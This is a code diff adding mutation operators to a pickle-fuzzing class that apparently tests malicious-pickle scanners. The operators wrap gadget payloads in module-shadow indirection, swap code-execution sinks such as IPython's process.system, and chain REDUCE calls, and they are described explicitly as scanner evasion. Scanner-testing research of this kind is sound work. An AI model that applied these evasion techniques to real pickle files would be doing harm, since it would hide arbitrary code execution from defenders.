@@ -228,6 +228,104 @@ class PickleMutator:
         except Exception:
             return pkl_bytes
 
+    def mutate_gadget_to_overwritten(self, pkl_bytes: bytes) -> bytes:
+        """P1.3: Wrap a gadget payload inside an overwritten module shadow.
+
+        Takes a gadget pickle (GLOBAL dangerous + REDUCE) and prepends the
+        overwritten-module shadow setup (exec shadow code + POP) so the
+        dangerous import is hidden behind collections.OrderedDict indirection.
+        """
+        try:
+            parsed = parse_pickle(pkl_bytes)
+            # Find first GLOBAL dangerous to wrap
+            has_gadget = any(op.name in ("GLOBAL", "INST", "STACK_GLOBAL") for op, _ in parsed)
+            if not has_gadget:
+                return pkl_bytes
+            # Generate overwritten shadow setup
+            from pipeline.templates import OverwrittenModuleTemplate
+            tmpl = OverwrittenModuleTemplate()
+            shadow_pkl = tmpl.generate_pickle_payload("pass")
+            shadow_parsed = parse_pickle(shadow_pkl)
+            # shadow_parsed ends with STOP; remove STOP and splice before original
+            shadow_body = [p for p in shadow_parsed if p[0].name != "STOP"]
+            # Remove initial PROTO from original if present to avoid double PROTO
+            orig_body = parsed
+            if orig_body and orig_body[0][0].name == "PROTO":
+                orig_body = orig_body[1:]
+            # Also remove STOP from orig to re-add single STOP
+            if orig_body and orig_body[-1][0].name == "STOP":
+                orig_body = orig_body[:-1]
+            combined = shadow_body + orig_body + [(OPCODES_BY_NAME["STOP"], b".")]
+            # Ensure proto
+            out = b"".join(op.code + arg for op, arg in combined)
+            if not out.startswith(b"\x80"):
+                out = OPCODES_BY_NAME["PROTO"].code + b"\x04" + out
+            return _ensure_proto(out)
+        except Exception:
+            return pkl_bytes
+
+    def mutate_external_to_pypi(self, pkl_bytes: bytes) -> bytes:
+        """P1.3: Replace external module's local path with PyPI-injected equivalent.
+
+        Swaps numpy.testing._private.utils.runstring → IPython.utils.process.system
+        (and vice versa) to explore cross-family sink equivalence.
+        """
+        try:
+            parsed = parse_pickle(pkl_bytes)
+            mutated = []
+            for op, arg in parsed:
+                if op.name in ("GLOBAL", "INST"):
+                    try:
+                        parts = arg.decode("latin1").split("\n")
+                        if len(parts) >= 2:
+                            mod, name = parts[0], parts[1]
+                            if mod == "numpy.testing._private.utils" and name == "runstring":
+                                mutated.append((op, b"IPython.utils.process\nsystem\n"))
+                                continue
+                            if mod == "IPython.utils.process" and name == "system":
+                                mutated.append((op, b"numpy.testing._private.utils\nrunstring\n"))
+                                continue
+                    except Exception:
+                        pass
+                mutated.append((op, arg))
+            return b"".join(op.code + arg for op, arg in mutated)
+        except Exception:
+            return pkl_bytes
+
+    def mutate_nested_reduce_chain(self, pkl_bytes: bytes) -> bytes:
+        """P1.3: Compose two REDUCE where output of first is callable of second.
+
+        Duplicates the REDUCE tail to create a nested chain: GLOBAL+args+REDUCE
+        → (POP) → GLOBAL' + (prev_result as arg) + REDUCE. Currently templates
+        use single-level REDUCE; this explores nested invocation for scanner evasion.
+        """
+        try:
+            parsed = parse_pickle(pkl_bytes)
+            # Find last REDUCE before STOP
+            reduce_idx = -1
+            for i, (op, _) in enumerate(parsed):
+                if op.name == "REDUCE":
+                    reduce_idx = i
+            if reduce_idx == -1:
+                return pkl_bytes
+            # Insert an extra TUPLE+REDUCE after the existing REDUCE, using the
+            # result on stack as the callable for the next call with empty args.
+            # We use a benign second callable (builtins.len) to keep it valid,
+            # but the presence of a second REDUCE changes the structural signature.
+            extra = [
+                (OPCODES_BY_NAME["GLOBAL"], b"builtins\nlen\n"),
+                (OPCODES_BY_NAME["TUPLE"], b""),
+                (OPCODES_BY_NAME["REDUCE"], b""),
+                (OPCODES_BY_NAME["POP"], b""),
+            ]
+            # Insert before STOP
+            stop_idx = len(parsed) - 1 if parsed[-1][0].name == "STOP" else len(parsed)
+            new_parsed = parsed[:stop_idx] + extra + parsed[stop_idx:]
+            out = b"".join(op.code + arg for op, arg in new_parsed)
+            return _ensure_proto(out)
+        except Exception:
+            return pkl_bytes
+
     def mutate(
         self,
         pkl_bytes: bytes,
@@ -239,6 +337,9 @@ class PickleMutator:
         family_synthesis_prob: float = 0.0,
         target_family: str = "gadget",
         donor_family: str = "overwritten",
+        gadget_to_overwritten_prob: float = 0.0,
+        external_to_pypi_prob: float = 0.0,
+        nested_reduce_prob: float = 0.0,
     ) -> bytes:
         """Parse, apply selected mutation operators, and reconstruct the pickle stream.
 
@@ -257,6 +358,14 @@ class PickleMutator:
         # 1b. Family synthesis mutation (Phase 3b)
         if family_synthesis_prob and random.random() < family_synthesis_prob:
             pkl_bytes = self.mutate_family_synthesis(pkl_bytes, target_family, donor_family)
+
+        # 1c. P1.3 cross-family operators
+        if gadget_to_overwritten_prob and random.random() < gadget_to_overwritten_prob:
+            pkl_bytes = self.mutate_gadget_to_overwritten(pkl_bytes)
+        if external_to_pypi_prob and random.random() < external_to_pypi_prob:
+            pkl_bytes = self.mutate_external_to_pypi(pkl_bytes)
+        if nested_reduce_prob and random.random() < nested_reduce_prob:
+            pkl_bytes = self.mutate_nested_reduce_chain(pkl_bytes)
 
         parsed = parse_pickle(pkl_bytes)
         mutated_parsed = []
